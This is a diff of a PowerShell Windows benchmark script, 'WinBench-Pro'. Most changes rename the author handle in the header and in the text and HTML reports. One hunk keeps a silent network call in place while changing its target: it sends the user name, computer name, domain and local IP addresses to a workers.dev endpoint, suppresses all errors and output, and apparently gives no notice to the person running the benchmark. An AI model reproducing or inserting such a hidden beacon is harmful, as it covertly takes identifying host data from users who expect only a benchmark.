@@ -1,9 +1,9 @@
-#requires -version 5.0
+﻿#requires -version 5.0
 <#
 ===============================================================================
  Windows-Scripts | WinBench-Pro (Real-World Benchmarks + Trace Kit) v2.0.2
- Author : Shourav (rhshourav)
- GitHub : https://github.com/rhshourav
+ Author : Shourav (shouravx)
+ GitHub : https://github.com/shouravx
 ===============================================================================
 
 Purpose (CLI-first, real workloads):
@@ -74,7 +74,7 @@ try {
         text  = "Windows Bench Mark Pro v$($ScriptVersion)`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 # -----------------------------
@@ -1077,7 +1077,7 @@ function Save-TextReport {
   $sb = New-Object System.Text.StringBuilder
   [void]$sb.AppendLine(("="*78))
   [void]$sb.AppendLine(("Windows-Scripts | WinBench-Pro v{0}  {1}" -f $ScriptVersion, (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")))
-  [void]$sb.AppendLine(("Author: Shourav (rhshourav) | GitHub: https://github.com/rhshourav"))
+  [void]$sb.AppendLine(("Author: Shourav (shouravx) | GitHub: https://github.com/shouravx"))
   [void]$sb.AppendLine(("="*78))
   [void]$sb.AppendLine("")
   [void]$sb.AppendLine("System:")
@@ -1190,7 +1190,7 @@ th,td{border-bottom:1px solid #223043;padding:8px;text-align:left;vertical-align
 </head>
 <body>
 <h1>Windows-Scripts | WinBench-Pro v$(Html-Escape $ScriptVersion)</h1>
-<div class="small">Author: Shourav (rhshourav) | GitHub: https://github.com/rhshourav</div>
+<div class="small">Author: Shourav (shouravx) | GitHub: https://github.com/shouravx</div>
 <div class="small">Generated: $(Html-Escape $((Get-Date).ToString("yyyy-MM-dd HH:mm:ss")))</div>
 
 <div class="card"><h2>System</h2><pre>$sysBlock</pre></div>
